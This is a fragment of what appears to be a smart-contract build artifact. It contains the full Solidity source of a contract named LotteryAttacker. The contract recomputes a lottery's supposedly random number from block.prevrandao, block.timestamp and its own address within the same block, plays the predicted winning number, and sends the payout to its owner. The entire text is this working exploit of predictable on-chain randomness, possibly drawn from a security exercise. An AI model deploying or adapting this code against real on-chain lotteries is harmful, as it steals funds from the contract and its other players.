      "bytecode": "",
      "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\nimport {ILottery} from \"./ILottery.sol\";\n\n/// @title LotteryAttacker\n/// @author Jérémie Nagi\n/// @notice Computes the lottery's number in the same block as the draw, then plays it.\ncontract LotteryAttacker {\n    ILottery public immutable lottery;\n    address public immutable owner;\n\n    error NotOwner();\n    error PayoutFailed();\n\n    constructor(ILottery target) {\n        lottery = target;\n        owner = msg.sender;\n    }\n\n    /// @notice Plays the number the lottery is about to draw. Send exactly one ticket price.\n    function attack() external payable {\n        if (msg.sender != owner) revert NotOwner();\n\n        uint256 guess = uint256(keccak256(abi.encode(block.prevrandao, block.timestamp, address(this))))\n            % lottery.RANGE();\n        lottery.play{value: msg.value}(guess);\n\n        (bool paid,) = owner.call{value: address(this).balance}(\"\");\n        if (!paid) revert PayoutFailed();\n    }\n\n    /// @dev Receives the prize.\n    receive() external payable {}\n}\n"
    }
